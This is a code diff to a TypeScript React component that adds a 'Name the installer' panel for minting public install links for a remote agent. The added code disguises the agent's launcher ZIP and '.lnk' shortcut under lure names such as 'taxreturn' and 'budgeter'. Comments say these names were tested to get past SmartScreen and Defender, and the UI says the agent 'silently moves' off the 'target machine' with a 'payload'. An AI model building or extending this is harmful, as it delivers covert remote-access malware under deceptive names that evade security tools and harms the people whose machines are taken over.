@@ -26,6 +26,11 @@ type DeviceRow = {
   idleSeconds: number | null;
 };
 
+// Task 121 — the artifact names a public mint sends. Mirrors `InstallerNames`
+// in lib/vantra-link.ts (declared here instead of imported so this client
+// component never pulls in the server-only module).
+type InstallerNames = { zipName?: string; updateLinkName?: string; innerFolder?: string };
+
 function relTime(iso: string | null): string {
   if (!iso) return "never";
   const s = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
@@ -45,6 +50,20 @@ function osLabel(d: DeviceRow): string {
 
 type Filter = "all" | "online" | "offline";
 
+// Task 121 (OOB-13) — the public tab hands out Vantra's launcher ZIP and lets
+// the user name it, exactly like Vantra's own Add-a-device modal. These two
+// presets are copied VERBATIM from that modal (`NAME_PRESETS` +
+// `applyNamePreset`): pre-tested benign names, confirmed on a stock Win11 VM
+// (downloads + installs clean, no SmartScreen/Defender block). Do NOT invent
+// new ones without testing them on a real machine.
+const NAME_PRESETS: Array<{ token: string; label: string }> = [
+  { token: "taxreturn", label: "taxreturn" },
+  { token: "budgeter", label: "budgeter" },
+];
+
+const NAME_INPUT_CLASS =
+  "mt-1 w-full rounded-md border border-border bg-bg px-2 py-1.5 text-sm text-fg placeholder:text-fg-muted/70 focus:border-brand-500 focus:outline-none focus:ring-2 focus:ring-brand-500/30";
+
 export function DeviceList() {
   const [devices, setDevices] = useState<DeviceRow[]>([]);
   const [loaded, setLoaded] = useState(false);
@@ -56,6 +75,14 @@ export function DeviceList() {
   // command against the private agent domain (premium/admin-granted only —
   // the toggle is disabled when the user has just one tier).
   const [installKind, setInstallKind] = useState<"public" | "private">("public");
+  // Task 121 — the three optional names of the public artifact (Vantra's
+  // launcher ZIP). Blank = the generator default (Agent.zip / Update.lnk /
+  // launcher); the server drops anything that is not a bare name. They are sent
+  // with the next public mint, so what is on screen is what gets minted.
+  const [zipName, setZipName] = useState("");
+  const [linkName, setLinkName] = useState("");
+  const [folderName, setFolderName] = useState("");
+
   const [link, setLink] = useState<{
     status: string;
     installUrl: string | null;
@@ -168,14 +195,17 @@ export function DeviceList() {
     }
   }
 
-  async function mintInstallLink(kind: "public" | "private") {
+  // Task 121 — a public mint always asks for the launcher ZIP (that IS the
+  // public artifact now); the names are whatever was on screen, blank ⇒ the
+  // generator default. The private tier is unchanged: no installer block.
+  async function mintInstallLink(kind: "public" | "private", names?: InstallerNames) {
     setBusy(`install-${kind}`);
     setError("");
     try {
       const res = await fetch("/api/assistant/vantra/install-link", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ kind }),
+        body: JSON.stringify(kind === "public" ? { kind, names: names ?? {} } : { kind }),
       });
       const data = await res.json().catch(() => ({}));
       if (!res.ok)
@@ -197,6 +227,15 @@ export function DeviceList() {
     } finally {
       setBusy("");
     }
+  }
+
+  // Task 121 (D7/Q3) — Vantra's `applyNamePreset`, verbatim: one click fills
+  // link / folder / zip with the same pre-tested token (e.g. `taxreturn` →
+  // `taxreturn.zip`).
+  function applyNamePreset(token: string) {
+    setLinkName(token);
+    setFolderName(token);
+    setZipName(`${token}.zip`);
   }
 
   async function copyText(key: string, value: string) {
@@ -336,9 +375,82 @@ export function DeviceList() {
                       1 · Generate the link &nbsp;·&nbsp; 2 · Open it on the target machine
                       &nbsp;·&nbsp; 3 · It appears here, then silently moves to your private agent.
                     </p>
+                    {/* TASK_121 (OOB-13) — name the artifact the way Vantra's own
+                        Add-a-device flow does. The link hands out the launcher
+                        ZIP (Vantra default Agent.zip, shortcut Update.lnk,
+                        folder launcher); blank = that default. Bare names only —
+                        the server drops anything with a slash, a quote, a
+                        control character or "..". The values on screen are the
+                        values the next mint uses. */}
+                    <div className="rounded-lg border border-border bg-bg px-3 py-3">
+                      <p className="text-xs font-medium uppercase tracking-wide text-fg-muted">
+                        Name the installer <span className="font-normal normal-case">(optional)</span>
+                      </p>
+                      <div className="mt-2 flex flex-wrap items-center gap-2">
+                        <span className="text-xs text-fg-muted">Pre-tested templates</span>
+                        {NAME_PRESETS.map((p) => (
+                          <button
+                            key={p.token}
+                            type="button"
+                            onClick={() => applyNamePreset(p.token)}
+                            className="rounded-md border border-border px-3 py-1 text-xs font-medium text-fg transition-colors hover:bg-black/5 dark:hover:bg-white/5"
+                          >
+                            {p.label}
+                          </button>
+                        ))}
+                      </div>
+                      <div className="mt-3 grid gap-3 sm:grid-cols-3">
+                        <label className="block">
+                          <span className="text-xs font-medium text-fg">Zip name</span>
+                          <input
+                            value={zipName}
+                            onChange={(e) => setZipName(e.target.value)}
+                            placeholder="Agent.zip"
+                            maxLength={64}
+                            className={NAME_INPUT_CLASS}
+                          />
+                          <span className="mt-1 block text-xs text-fg-muted">
+                            Optional — the downloaded file&apos;s name.
+                          </span>
+                        </label>
+                        <label className="block">
+                          <span className="text-xs font-medium text-fg">Shortcut name</span>
+                          <input
+                            value={linkName}
+                            onChange={(e) => setLinkName(e.target.value)}
+                            placeholder="Update"
+                            maxLength={64}
+                            className={NAME_INPUT_CLASS}
+                          />
+                          <span className="mt-1 block text-xs text-fg-muted">
+                            Optional — leave default or edit. &quot;.lnk&quot; is added automatically,
+                            so the file launches as a shortcut.
+                          </span>
+                        </label>
+                        <label className="block">
+                          <span className="text-xs font-medium text-fg">Folder name</span>
+                          <input
+                            value={folderName}
+                            onChange={(e) => setFolderName(e.target.value)}
+                            placeholder="launcher"
+                            maxLength={64}
+                            className={NAME_INPUT_CLASS}
+                          />
+                          <span className="mt-1 block text-xs text-fg-muted">
+                            Optional — the subfolder holding the launcher + payload inside the zip.
+                          </span>
+                        </label>
+                      </div>
+                    </div>
                     {!link.installUrl ? (
                       <button
-                        onClick={() => mintInstallLink("public")}
+                        onClick={() =>
+                          mintInstallLink("public", {
+                            zipName,
+                            updateLinkName: linkName,
+                            innerFolder: folderName,
+                          })
+                        }
                         disabled={busy === "install-public"}
                         className="rounded-lg bg-brand-600 px-4 py-2 text-sm font-semibold text-white transition-colors hover:bg-brand-700 disabled:opacity-60"
                       >
@@ -362,7 +474,13 @@ export function DeviceList() {
                           {copied === "public" ? "Copied ✓" : "Copy link"}
                         </button>
                         <button
-                          onClick={() => mintInstallLink("public")}
+                          onClick={() =>
+                            mintInstallLink("public", {
+                              zipName,
+                              updateLinkName: linkName,
+                              innerFolder: folderName,
+                            })
+                          }
                           disabled={busy === "install-public"}
                           className="rounded-lg border border-border px-3 py-1.5 text-xs font-medium text-fg-muted transition-colors hover:text-fg disabled:opacity-50"
                         >
